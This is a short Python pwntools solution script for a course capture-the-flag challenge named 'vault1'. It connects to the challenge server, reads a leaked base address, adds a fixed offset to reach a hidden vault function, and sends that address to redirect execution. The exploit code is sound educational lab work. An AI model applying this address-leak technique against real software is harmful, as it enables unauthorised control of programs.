from pwn import *

#context.log_level = "DEBUG"

CHALLENGE = "vault1"
PORT = 1231
NETID = b"os2178"
LOCAL = False
if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

#grab baseAddress from output
print(p.recvuntil(b"But I found this base address "))
#print("\n")
baseAddress = p.recvuntil(b" ").strip()
#print(baseAddress)

#Vault Offset
vaultOffset = "0x1249"

#find vault address
vaultAddress = hex(int(baseAddress, 16) + int(vaultOffset, 16))
#print(vaultAddress)

print(p.recvuntil(b"> ").decode())
p.sendline(vaultAddress.encode())
p.interactive()
